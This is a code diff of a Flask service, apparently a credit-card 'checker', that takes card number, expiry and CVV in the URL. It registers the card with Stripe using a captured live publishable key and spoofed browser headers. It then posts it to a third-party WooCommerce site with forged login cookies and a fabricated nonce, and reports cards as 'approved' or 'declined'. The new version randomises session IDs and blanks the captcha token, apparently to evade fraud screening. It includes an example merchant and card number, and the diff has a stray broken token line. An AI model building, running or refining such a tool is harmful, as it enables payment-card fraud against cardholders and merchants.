@@ -1,69 +1,4 @@
-# app.py
-from flask import Flask, request, jsonify
-import requests
-import re
-
-app = Flask(__name__)
-
-def parse_card_data(card_string):
-    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
-    parts = card_string.split('|')
-    if len(parts) != 4:
-        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
-    
-    card_no, month, year, cvv = parts
-    
-    # Clean and format card number (remove spaces and special characters)
-    card_no = re.sub(r'\s+', '', card_no)
-    card_no = re.sub(r'[^\d]', '', card_no)
-    
-    # Format year (if 4-digit, take last 2)
-    if len(year) == 4:
-        year = year[2:]
-    elif len(year) != 2:
-        raise ValueError("Year should be 2 or 4 digits")
-    
-    # Ensure month is 2 digits
-    month = month.zfill(2)
-    
-    # Validate CVV
-    cvv = re.sub(r'[^\d]', '', cvv)
-    
-    return card_no, month, year, cvv
-
-def format_card_number(card_no):
-    """Format card number with spaces for display"""
-    groups = []
-    for i in range(0, len(card_no), 4):
-        groups.append(card_no[i:i+4])
-    return ' '.join(groups)
-
-@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
-def stripe_payment(site, card_data):
-    try:
-        # Parse card data
-        card_no, month, year, cvv = parse_card_data(card_data)
-        formatted_card = format_card_number(card_no)
-        
-        # First Stripe API request
-        stripe_headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-
-        # Construct the data payload with the provided card details
-        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F{site}&time_on_page=32174&client_attribution_metadata[client_session_id]=1f57d457-dc2c-4e6d-8b80-f59cfe019b27&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=996bc306-a8d8-4e33-a84f-8621ac36171e&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=e98e75fe-0fff-406c-87eb-7a698336d1000abe71&sid=53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc&key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY1NDczMTY1LCJjZGF0YSI6Ijhad1dTMktFVGkvZld6b2ZFWmR2YXpldmhpRjhWTFhvZ3hYQlhKR0hWaDBWUkFPMjUwcjE0Y2NGcjFqYitkS0c1UFJ6RFg0ekFDbUpXUFhiQmt4bU5XQUtGRERLWXdXVURSeVQ5ZTVBSmpVcy9TOWJDdU9PbzNESGZzNzMwYjZLQTVhMExYVTJERHUzNHh6OGhsTTBPYXVWZ3UxZXlwcWhuT3I3SjFNV3JUdWdUSVQxRFlVaTJOSU1GcFFCekZxcWxqOXB6V0k5bWxYZTRsN3ciLCJwYXNza2V5IjoiZnNjdSsxbGVKKzZnRkhXOHVteUZsbldrM2FjYlBZekFJSkVKNzUrcGtvNzhRNGJGS3BmYk5FdkNyU2ZxS0VKWlpsK0Q5dTVKS3lySXZ6NlI0T3BWMEtOUGcwVXRhVDhYbUIxdHdTYjJ3VEVHMXdvMFVsNnoyRjVFRTVGWkVGSGxJL3phUXVZeVcwbjJsd3lpckhyaGRpcHZ1MzBxSlBmRVpNZzlvMmdnK2NwOHQ3dHJGSDNkMDV4NWFzUkpqcEpLVnp0cTBuMzBaZTlwM2JLdjgrQkdiVVkyZnd2L1VKOGtzSmFRd2kxc1NYOWhiZ1lDV0FpUzgwcHhlSjF5TWhib2dRbWFhamlSajBiT2t4TTFmRUFST284R2FHVlBneGpGNXpJK1V3RFpBMFhFQVlBTFRuZ0RVMHNiM1JZeGl0Sjc0VlNPNlA4TGFjLzk3Zy9NL1dZOHlacSt1WGhDenE0SENGT0V3Tnk3RStqNjQ5Q0djcjB0QVJBM0oyMXI1ZUM3ZFFFZWtJRHRONjdHOXNQeDAzTCt2N21EYk1XZnlvLzAra2NGeHBnQ0EwSEgrT3BPOGUvRlpUR3J2TVVOR3JqRXZ1d2gzMFRQcWxySzB6TVVSN1NSMWdUeGJ5YnY1V3N6VUpqdCtvcnhwZmU5U3gxMmNxUnFuL1FrOFA4cXBhUzBCaE9DV01TRm9pNmhKVFlmRDh4QmFZdkpKQUdFbnJxYTMwb1BaMy9QRlRhYXZiNzl1MlFlTVpaYVlGcXpJSkZ2SG5PbFBDUkZnZjNkUFR4ZytVL0ZwWXFiV3RHS0lyczdqTHdHVW16cEI2RWJYa0dUWGJiL3ZkaWxIc2xwbS9qRzZ0WmttWmc4T3Ixd0NZbktXTSthMmw1azBOazRPV0VHQmFGM1VDcWV2SVhLU2N0NmNYYjNMVUFCaGdIaytMcnNybGY0T0NCL3pnVU1hWHBEa0JRQ3JFVHk1WExaSjUxN1BYOWRQVVpxb3dkc3dUR3k0c3A1dkhDSzBTeUZsRTlBWExtbW9nOGliTEFtZTZxcURFVHZYWGZuVXF2bVRRb0NQVjZnb3dJZkZsNlpXam5XbXVvZkxOeVRWbEMzbTlPV3hLUlJqOVZSeElOb0xKcCt5RWtpdXlhZHk4cVlVd3VkYmt4c0dvM092N0hHblF0NytuNGt4K1lIMjF1eklMRW1xTjB3WFozVy9TbWpXK1g2a0hveDhoMGhkTDg5WkJFa2VXNjhPVmQxUXNyUFpUbVgwY0srMWtJSy90WlpmTDRhc00vQm44TVZpUWZqUVJqMHFZMWZlNllkS2VPY0VHRWFYOXk1VVFwNEVuaE5RR2FlN284WjcyTzh6cngvVU5xMlFtSS9lUzBmR3ZPM3l3bWFXT0R2NGVsdWFpV2RrVWNKY0pyc3k0dFpSUXBackN5M3pCR1JDR1lyaVh4TFNBdisyWnhkeDhIRjBPOWlnbFJhcGgrdnJjNWpQNzR6UVdGdlZIV3dZaWhwUjJXaDM3YWtZa0hpZkI1eElQTmIrQjIrOWZ1NmRjKzhIemdNaVZheXZGOGVBRDFvNkxxOUF1TmtQUWNIbzNDVzFpalZHT2xtWTQ2NUNGRmpJbklqbCtTNHk1Q0tyMWszSWJDYklJTFRFcUVaRERWcU9IY2FuTks1cjZ2dkY4RWNpWHU0ZHRtcTVaNzQ3TFBqQkZJK2oycUNkNSs0enRXUGN0eTNta2N4eXc2Lzhxanl1UTlpN3V6MzFnUHdoU3J3Rm41WHQ1NXVKRGJ5VlA4QkorVklBckNtQnNkYnJqM2NZZTA4WWMyamJ1Mkx1Z21TbHYrd1MyaWlQNldWVTdvZjV1QUZ0UERweGFMZU9BYTViNnB4L3JiSnQrcmNhYUpaZDFXQUkwd2w4ZlBlL1duVHJQZzIzQzIwRy9IOFkvUHhkejE4UEtkOXUzNWJ1NTFFV2dYWHgxWEs3WmVsRUNvdXZoZVZ4NCtwRnJKVGMvV2YyT3F6MkNyNVhKWTlYWnJEVlR0Y0xyOVVvNGNhQ2tYL2lhZHZFZ2ZsZXFzNExENGh1Yk12K1M3a0J6SHVMVEhmc3J0eU1DdUY1TjMzL2hkandTQ05Tamo4a3Ntckpyenp1TVA0bURmY3hsOGxBZm52bkZaZUVERFVXdzlOK2ptSUtMV2ZmQ3Z4dFdrblhRelIxTHRKOG5leEdmUnNiR0Q0N0s5RklGODFCTEduMFh2Y1pwUXNJQS9ORGdwOEtYR1pBUWlxN0lNZGRkKzBzd3BDRkIzQUJhNHJHd2lzd1p2WjZhaWZyZFFhcGIzNmRCS01aUVBEWDY1MU50WmxTdktVZDN3c25aMisvZEJtbGtLQVp2V1ZuSGlWck1yZ0ZCUEJ5RVlRcFh4QjZHZHQyYmVmNHRIS2xjSjFlM1RudmFhdTZ1K2VURFl1M2ltZFVkV291OFFCSm1TcTEwQ0d2SDNXVEh6eEs2aFJDMUZLTHFzQ3pOU29JNGlzV0IvZTBFRkcxNnFqL2VTK1RnVnMvRE54ZHBPbzB1VExWMVJzQkFsbkU1eGIvOFdFQXlrY1Axc3EvQXQ1Iiwia3IiOiIyYjIxODkwYyIsInNoYXJkX2lkIjoyNTkxODkzNTl9.pBWEza2uRyGft4lwP9sJ3CW45qMteoUjXbKLxbNQ91c'
+SDNXVEh6eEs2aFJDMUZLTHFzQ3pOU29JNGlzV0IvZTBFRkcxNnFqL2VTK1RnVnMvRE54ZHBPbzB1VExWMVJzQkFsbkU1eGIvOFdFQXlrY1Axc3EvQXQ1Iiwia3IiOiIyYjIxODkwYyIsInNoYXJkX2lkIjoyNTkxODkzNTl9.pBWEza2uRyGft4lwP9sJ3CW45qMteoUjXbKLxbNQ91c'
 
         # Make first request to Stripe
         stripe_response = requests.post(
@@ -207,3 +142,250 @@ def index():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=1100, debug=True)
+# app.py
+from flask import Flask, request, jsonify
+import requests
+import re
+import uuid
+import time
+
+app = Flask(__name__)
+
+def parse_card_data(card_string):
+    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
+    parts = card_string.split('|')
+    if len(parts) != 4:
+        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
+    
+    card_no, month, year, cvv = parts
+    
+    # Clean and format card number
+    card_no = re.sub(r'\s+', '', card_no)
+    card_no = re.sub(r'[^\d]', '', card_no)
+    
+    # Format year
+    if len(year) == 4:
+        year = year[2:]
+    elif len(year) != 2:
+        raise ValueError("Year should be 2 or 4 digits")
+    
+    # Ensure month is 2 digits
+    month = month.zfill(2)
+    
+    # Validate CVV
+    cvv = re.sub(r'[^\d]', '', cvv)
+    
+    return card_no, month, year, cvv
+
+def format_card_number(card_no):
+    """Format card number with spaces for display"""
+    groups = []
+    for i in range(0, len(card_no), 4):
+        groups.append(card_no[i:i+4])
+    return ' '.join(groups)
+
+def generate_dynamic_data(site, card_no, month, year, cvv):
+    """Generate dynamic data for Stripe API call"""
+    # Generate fresh UUIDs
+    guid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
+    muid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
+    sid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
+    client_session_id = str(uuid.uuid4())
+    elements_session_id = str(uuid.uuid4())
+    
+    # Current timestamp
+    current_time = int(time.time())
+    time_on_page = current_time - (current_time % 1000)
+    
+    # Format card number
+    formatted_card = format_card_number(card_no)
+    
+    # Create dynamic data
+    stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}'
+    stripe_data += '&allow_redisplay=unspecified'
+    stripe_data += '&billing_details[address][country]=IN'
+    stripe_data += f'&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
+    stripe_data += f'&referrer=https%3A%2F%2F{site}'
+    stripe_data += f'&time_on_page={time_on_page}'
+    stripe_data += f'&client_attribution_metadata[client_session_id]={client_session_id}'
+    stripe_data += '&client_attribution_metadata[merchant_integration_source]=elements'
+    stripe_data += '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
+    stripe_data += '&client_attribution_metadata[merchant_integration_version]=2024'
+    stripe_data += '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
+    stripe_data += '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
+    stripe_data += f'&client_attribution_metadata[elements_session_config_id]={elements_session_id}'
+    stripe_data += '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
+    stripe_data += f'&guid={guid}'
+    stripe_data += f'&muid={muid}'
+    stripe_data += f'&sid={sid}'
+    stripe_data += '&key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu'
+    stripe_data += '&_stripe_version=2024-12-11'
+    stripe_data += '&radar_options[hcaptcha_token]='
+    
+    return stripe_data
+
+@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
+def stripe_payment(site, card_data):
+    try:
+        # Parse card data
+        card_no, month, year, cvv = parse_card_data(card_data)
+        
+        # Generate dynamic data for Stripe API
+        stripe_data = generate_dynamic_data(site, card_no, month, year, cvv)
+        
+        # Stripe headers - updated with more generic values
+        stripe_headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+        }
+
+        # Make request to Stripe
+        stripe_response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=stripe_data,
+            timeout=30
+        )
+
+        # Log Stripe response for debugging
+        print(f"Stripe Status: {stripe_response.status_code}")
+        print(f"Stripe Response: {stripe_response.text[:200]}...")
+
+        if stripe_response.status_code != 200:
+            return jsonify({
+                'status': 'declined',
+                'response': 'card was declined - Stripe API error',
+                'debug': f'Stripe status: {stripe_response.status_code}'
+            }), 200
+
+        stripe_data_response = stripe_response.json()
+        payment_method_id = stripe_data_response.get('id')
+        
+        if not payment_method_id:
+            return jsonify({
+                'status': 'declined',
+                'response': 'card was declined - No payment method ID',
+                'debug': stripe_data_response
+            }), 200
+
+        # Generate fresh cookies for site request
+        current_time = int(time.time())
+        wordpress_token = f"user%7C{current_time + 86400}%7C{str(uuid.uuid4())}"
+        
+        # Create dynamic cookies
+        site_cookies = {
+            'wordpress_logged_in_' + str(uuid.uuid4())[:8]: wordpress_token,
+            '__stripe_mid': str(uuid.uuid4()),
+            '__stripe_sid': str(uuid.uuid4()),
+            '_ga': 'GA1.1.' + str(int(time.time())) + '.' + str(current_time),
+        }
+
+        # Site headers
+        site_headers = {
+            'authority': site,
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': f'https://{site}',
+            'referer': f'https://{site}/my-account/add-payment-method/',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        # Generate fresh nonce (in real scenario, you'd need to fetch this from the site)
+        nonce = str(uuid.uuid4())[:10]
+
+        site_data = {
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': payment_method_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': nonce,
+        }
+
+        # Make request to merchant site
+        site_response = requests.post(
+            f'https://{site}/wp-admin/admin-ajax.php',
+            cookies=site_cookies,
+            headers=site_headers,
+            data=site_data,
+            timeout=30,
+            verify=True  # Enable SSL verification
+        )
+
+        print(f"Site Status: {site_response.status_code}")
+        print(f"Site Response: {site_response.text[:200]}...")
+
+        # Check response
+        if site_response.status_code == 200:
+            try:
+                response_json = site_response.json()
+                if isinstance(response_json, dict):
+                    if response_json.get('result') == 'success' or 'success' in str(response_json).lower():
+                        return jsonify({
+                            'status': 'approved',
+                            'response': 'payment method added successfully',
+                            'debug': 'Site API returned success'
+                        }), 200
+            except:
+                # If JSON parsing fails but status is 200, check text
+                if 'success' in site_response.text.lower():
+                    return jsonify({
+                        'status': 'approved',
+                        'response': 'payment method added successfully',
+                        'debug': 'Success found in response text'
+                    }), 200
+        
+        return jsonify({
+            'status': 'declined',
+            'response': 'card was declined',
+            'debug': {
+                'stripe_status': stripe_response.status_code,
+                'site_status': site_response.status_code,
+                'site_response': site_response.text[:500] if site_response.text else 'No response'
+            }
+        }), 200
+
+    except Exception as e:
+        print(f"Error: {str(e)}")
+        return jsonify({
+            'status': 'declined',
+            'response': 'card was declined',
+            'debug': f'Exception: {str(e)}'
+        }), 200
+
+@app.route('/health')
+def health_check():
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': time.time(),
+        'service': 'stripe-payment-gateway'
+    }), 200
+
+@app.route('/')
+def index():
+    return jsonify({
+        'message': 'Stripe Payment Gateway API',
+        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
+        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
+        'note': 'All responses return HTTP 200 with status in JSON body'
+    })
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=True)
